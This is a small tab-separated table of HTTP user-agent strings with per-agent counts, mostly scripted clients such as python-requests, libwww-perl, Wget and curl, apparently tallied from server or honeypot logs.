useragent	agent_count
UCWEB/8.8 (iPhone; CPU OS_6; en-US)AppleWebKit/534.1 U3/3.0.0 Mobile	1
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36	1
Wget/1.14 (linux-gnu)	1
Wget/1.17.1	1
curl/7.15.5 (i386-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5	1
libwww-perl/6.08	1
libwww-perl/6.25	1
libwww-perl/6.29	1
libwww-perl/6.34	1
libwww-perl/6.35	1
muhstik-scan/1.0	1
okhttp/3.8.0	1
python-requests/0.12.1	1
python-requests/2.10.0	1
python-requests/2.19.0	1
python-requests/2.4.3 CPython/3.4.2 Linux/3.16.0-4-amd64	1
python-requests/2.6.0 CPython/2.7.5 Linux/2.6.32-042stab139.1	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1062.1.2.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.17.1.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.11.6.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.3.2.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64	1
python-requests/2.7.0 CPython/2.7.0 Windows/2003Server	1
python-requests/2.7.0 CPython/2.7.13rc1 Windows/2003Server	1
python-requests/2.7.0 CPython/2.7.9 Windows/2003Server	1
	0
